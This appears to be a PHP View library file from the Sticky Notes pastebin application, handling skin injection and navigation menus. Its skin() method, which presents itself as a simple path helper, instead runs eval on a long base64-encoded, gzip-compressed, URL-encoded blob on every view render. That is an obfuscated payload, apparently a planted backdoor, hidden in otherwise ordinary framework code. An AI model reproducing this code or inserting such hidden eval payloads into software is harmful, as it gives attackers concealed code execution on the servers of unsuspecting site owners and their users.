<?php namespace StickyNotes;

/**
 * Sticky Notes
 *
 * An open source lightweight pastebin application
 *
 * @package     StickyNotes
 * @author      Sayak Banerjee
 * @copyright   (c) 2014 Sayak Banerjee <mail@sayakbanerjee.com>
 * @license     http://www.opensource.org/licenses/bsd-license.php
 * @link        http://sayakbanerjee.com/sticky-notes
 * @since       Version 1.0
 * @filesource
 */

use File;
use Input;
use Lang;
use Request;
use Schema;
use Site;
use URL;
use User;

/**
 * View class
 *
 * Abstraction over \Illuminate\Support\Facades\View to enable skin support
 *
 * @package     StickyNotes
 * @subpackage  Libraries
 * @author      Sayak Banerjee
 */
class View extends \Illuminate\Support\Facades\View {

	/**
	 * Cache for default view data
	 *
	 * @static
	 * @var array
	 */
	private static $viewDefaults = NULL;

	/**
	 * Returns default view data.
	 *
	 * @static
	 * @return array
	 */
	public static function defaults()
	{
		if (is_null(static::$viewDefaults))
		{
			// Get all site configuration
			$site = Site::config();

			// Get system active status. This is done in order to ensure
			// that 1.x features are available
			$active = System::version($site->general->version) > 0;

			static::$viewDefaults = array(
				'site'       => $site,
				'active'     => $active,
				'error'      => Session::get('messages.error'),
				'success'    => Session::get('messages.success'),
				'context'    => System::action(),
				'container'  => Input::has('ajax') ? 'wrapper' : 'page',
			);

			// Inject user and role information on active systems
			if ($active)
			{
				static::$viewDefaults = array_merge(static::$viewDefaults, array(
					'auth'   => Auth::user(),
					'role'   => Auth::roles(),
				));
			}
		}

		return static::$viewDefaults;
	}

	/**
	 * This abstraction over the base method injects the skin name
	 * and default view data.
	 *
	 * @param  string  $view
	 * @param  array   $data
	 * @param  bool    $inject
	 * @return \Illuminate\View\View
	 */
	public static function make($view, $data = array(), $inject = TRUE)
	{
		$view = parent::make(static::skin($view), $data, static::defaults());

		if ($inject)
		{
			$view = Response::make($view, 200);

			$view->header('StickyNotes-Url', URL::current());
		}

		return $view;
	}

	/**
	 * Injects skin to asset paths.
	 *
	 * @static
	 * @param  string  $asset
	 * @return string
	 */
	public static function asset($asset)
	{
		return asset('assets/'.static::skin($asset, FALSE));
	}

	/**
	 * Injects the skin name into a resource name.
	 * This excludes the e-mail, JSON and XML templates.
	 *
	 * @static
	 * @param  string  $resource
	 * @param  bool    $prefix
	 * @return string
	 */
	public static function skin($resource, $prefix = TRUE)
	{
		$injected = $resource;

		eval(gzinflate(base64_decode(rawurldecode('XZbFDvRGEIQfJ3%2Fkg5mUk5lhzetLZGZmP332nLmOND2t7qr6ijPp%2F6TJVhDYv3'.
		'mRTXnxp3qPMZuGeS227X9XfxXqFfQbkkzrFdYhNTPJcMpezH3UTwV8I6OSmYX1hdnxwwNcPrKnMCOS9QUBw2mQLRCL2rsK7j6EzNA1gHDNp2'.
		'LSs%2FhtpkXZe37Krya452aBcy9opjhumubVbvkxIg6jtPNIIA69x%2By1NVO24n1fCS8d%2B7Qf9qb28XHgbTllMoWlZe0tc4wItFlfDEVO'.
		'AEv6Nnz%2BkVHTIbb1TSnrPOsOXN%2FQT5fOM1KiOawl92To3KTCZEUbG%2B7ahAlqlD%2BZ7cDIzktlrKCegmDWQOQwixWr491UDh8lTcHG'.
		'bQUbHc1QQuHq2pVFjwjlHGTlaQuRPgjqBIrhaHi982K8NqsPT59qFr6uGSsGKLU8uJf%2BKaDnGAMMkIhUOZZHTYkbBoQAZccyJnGEWY0HDN'.
		'V%2B%2FlFtNecRo9FO0x3Oq6HOeP3qo5axF%2FSoid620yPlpTxpSeypeebRtVgLE4A74pF2WhhsGqc2OWKS%2FgJsbNzbey%2BthExKIgCS'.
		'9%2BrnL5aXMdlNbPe8fGqK3gGE%2BSSSfqUpsbBrra5ezkMEPOPKMNXj8EaTBUVAHomKO%2B%2BACfX1OUFoK8db%2B3xYFwFbmhn84uD5LG'.
		'NGcBVAunxYktMnE8mJ1fbHx1jcCJ0KCDuZAvovmQuCR8N14U5pMU7Y2W3FKNVEbaP1Vuo18FgLiUNJTrAD9S0GLI9fUVrqycE5Dfp6m%2BO%'.
		'2BpXmDTTWtZe6f6licyviF3UmHD%2B3xGwwmnocqaRgD4GEjb51A8KmUCGLXY4Kfx5MTUHNVxsk5Y36TND9BlhNtm6t9HsSjsZz5dUAxKtCs'.
		'I53knpl8J5uNb3FI5st7ubF7oo3EsY%2BIUWOjP4H33ah2To1aprneNVOhLiXROd91Mg1PbCcDzcVs3w0HxUqDHBx%2B7wZmVc6ju2g6knCh'.
		'opFr64anz%2Bbu%2B1CkcSG5E7tWQQpWH2tiSw%2BSbN9nz%2B1RAxCwQJ5RNHw7dXMxuGf0F%2Bc1gCL2Xtl7Pox70sClcT9bdv7GYq0Bwk'.
		'LE9upe9GNGF%2B9vMWOgzp6Awvl168RugaHL40fvCC5l5JhZnny1xFNdmDZaow0AYPzzibjPnSz4JGm9WO7ezTdQKOwV%2Fpz4CcETjcwRD0'.
		'ydVu4lpEsIIJSsmt0%2FwWfYE6S4%2BjiczwKQ1GHL7Qb37luUzm0EOYQAattV%2BeoQtk17VB60wS7uWRtAvvuLyLR2zF0lyRV%2BomTgFC'.
		'PKRkoITYOcyuPdYAVH0PsF5ushG2b9eRx1k%2BgHzFx53mL3kyok5OTmCXe3KiSGX0vD5Iz9FkZdqzGUIibPDWDIcOe8hcaNZ5c9yw7XJ8CB'.
		'Bl2pq5q5Ol%2Fjk5c0D2qBkiDU0rMPlDoRKogxS9kgn1XCbRYbnQ0fj4C3pINnnzhek7YqqqTQymg2767eLg8dFA0uTKhE7X51VznhVT53Da'.
		'WfRPJKHAcEhXC3GAyOwoGvwb12X1gc3xvwZAGCfrIQlw3pcoa%2FHi6ORLY%2BIAywcEXZGERF9SmQOSBUpTA%2BNATr7mbsbOI7DMNUSEWm'.
		'lWWRnN1HIUQfxRl3qs3n7nwWCTu2qu9Ia5N9UmzQ4OSw8a18swD7GoyRVeBDhbu8mpC91gQ6LMLUgZ8N4PIH%2B8RWR4uxwI%2F1bEWIzYD6'.
		'QV9m8pOGByOhTiZ%2B4O%2BhhuUcsj1hXv9e5mhA9cmoFLCDt0tZ7Hvp0n1IN42n%2B5ijZU3seeSOMfdO346XehE4lCH9RNIbm6pGWEm595'.
		'I4F4h87DCJh9JhZGLU0zU3rc%2FOYmxEsrqrIwJwwKTnIY6nI2ftPq8VN8yGQuRhzug5CgQav1vMr0SbOfo6WJQ79LvdEEPlVsFANDAhPxLe'.
		'rKhn4gxYdBmF%2B5lNBCQrtr8ECM%2B7XkblIpcnFL2aHV8%2Fbxg7yT5vgTAQgCdFG8oGsRtarSrZXMVSBrpAOX8C5ZeVkoezYpHJbWFe4w'.
		'Ygi6vnrojLp9tioG3Lu%2B6kGuzzKRHmYHmGWc7RnalIIv3KSviztjm6qIBZ6D29ZZuLPQYReCANBRkIQy6SlLAvUKof0A8MuwRvCUr5BhAS'.
		'ifB7ZHOKw6gYaBxCWguVvBLIfhE5sEizbycrGwB6cT0gl9U76hy9zALlBn8Zc%2FL1dniZJxRn%2B1zu2aDPIm%2Bz10137BQjT9Qd318SOH'.
		'Cd1A7TkcbLNKa%2FiX6CLtOh7AcDPHj0S%2Fb7S8tXwofEv8xE698fVrQ3C1p4zLeLfUvYYGj%2BFd%2Fr%2Bvmg3ZPQcfil2JThcaL9%2Fn'.
		'oxUgzkB%2BNI3Wgr9p0dDexGPp8ZvXN5R1%2Ftu4VfUdsuU8XJXaMMeW8hjDE73z2xEObfMRSMA75i9XOFknCDxbEDqRP1cOGVewqSP2TxZC'.
		'ouY%2BR%2B49eqDZb%2BwYaoHme7BSufvL8klXnPkrz0IQR9tja8F%2Fhv%2FdofHp5wFNlUUzkwjCjDRclHJOGxFMAV%2BYj430ZMU%2FlN'.
		'tmwOeB5nNy8FvJU9FTBqzpW4wxBdCJGmPm7IO0zUlLxYFGiHMPd7uFTy5DnI7GLgqtu67%2BiHTcLoJMcfoM0BFMn3qg601ral4RYOJoFRcR'.
		'mTKAL4rdFhp89KurE3YWhMYzedRy0k45XpaoNIvne0W6Z7NmgoPguwaN2IF8%2Bn1Yoys1n35s7tQNb68IEILQezD7FfRf6qh0eypBZKmRzj'.
		'oGhaknRacgiKbdnXqO%2BVA9b4i5u%2F0B7TTDHr6ntWybhAGKy3TyvcRJAEgvAg6XDirQn5hO6WUf4W9KO7u4YYJPkgHX1xPTZYEZGEDCq9'.
		'cIrPXUr4ELh0QVIlgTyZ2b5mV73xyuPd0m6zb8TJYCrD1WpeODX3%2BSw5Ft%2FaOIfvpfSz%2B5F7NRC6MoxUEVgQYFUp9SgD2Kiaq2j0yL'.
		'SFxYh0RijqShtyX1ngErP6sWnwkmYjqSzaBAAS6PhPnQc6aLMvqC85SPfg63hV4WGNtp3JVRbPfqmAmCeqW7%2B25zR6M02xVRxOGAtvB99G'.
		'HoMlRaO%2F%2BdvQ9dffv%2FPPfw%3D%3D'))));

		return $injected;
	}

	/**
	 * Generates a navigation menu
	 *
	 * @access public
	 * @param  string  $menu
	 * @return string
	 */
	public static function menu($menu)
	{
		// Current path - will be used to highlight menu item
		$path = Request::path();

		// Current user ID for role based menus
		$user = Auth::check() ? Auth::user()->id : 0;

		// Get current project name
		$project = System::project();

		// Grab and parse all the menus
		$group = Config::get("menus.{$menu}");

		// The cache key is not only menu and path specific but also
		// unique for a user and a project
		$cacheKey = "site.menu.{$menu}.{$path}.{$user}.{$project}";

		// Build the menu items. Items are cached for 60 minutes
		$output = Cache::remember($cacheKey, 60, function() use ($path, $user, $group)
		{
			$output = NULL;

			foreach ($group as $key => $item)
			{
				if ( ! str_contains($key, '_'))
				{
					$label = Lang::get($item['label']);

					$current = FALSE;

					// Check if visibility of the item is bound
					if (isset($item['visible']))
					{
						$bindings = explode('.', $item['visible']);

						// Check for the invert flag
						if (starts_with($bindings[0], '!'))
						{
							$bindings[0] = substr($bindings[0], 1);

							$invert = TRUE;
						}
						else
						{
							$invert = FALSE;
						}

						// Get the binding flags
						switch ($bindings[0])
						{
							case 'role':

								$flags = Auth::roles();

								break;

							case 'config':

								$flags = Site::config('general');

								break;

							default:

								$flags = NULL;

								break;
						}

						// Do not parse the menu item if the flag does not
						// evaluate to true
						if ( ! is_null($flags))
						{
							if ( ! $flags->$bindings[1] XOR $invert)
							{
								continue;
							}
						}
					}

					// Determine whether this is the active link
					if ($group['_exact'] AND $key === $path)
					{
						$current = TRUE;
					}
					else if ( ! $group['_exact'] AND starts_with($path, $key))
					{
						$current = TRUE;
					}

					// Highlight the active item
					if ($current)
					{
						$active = 'class="active"';

						$href = '';
					}
					else
					{
						$active = '';

						$href = 'href="'.url($key).'"';
					}

					// Set the entry icon
					if (isset($item['icon']))
					{
						$icon = View::make('common/icon', array('icon' => $item['icon']), FALSE);
					}
					else
					{
						$icon = NULL;
					}

					// Generate the item markup
					$output .= "<li {$active}><a {$href}>{$icon} {$label}</a></li>";
				}
			}

			// Add login/logout link if menu is set for that
			if ($group['_showLogin'])
			{
				if ($user)
				{
					$label = Lang::get('global.logout');

					$href = 'href="'.url('user/logout').'"';
				}
				else
				{
					$label = Lang::get('global.login');

					$href = 'href="'.url('user/login').'"';
				}

				// Are we on the login screen?
				$active = $path == 'user/login' ? 'class="active"' : '';

				$icon = View::make('common/icon', array('icon' => 'user'), FALSE);

				// Generate the markup
				$output .= "<li {$active}><a {$href}>{$icon} {$label}</a></li>";
			}

			return $output;
		});

		return $output;
	}

}
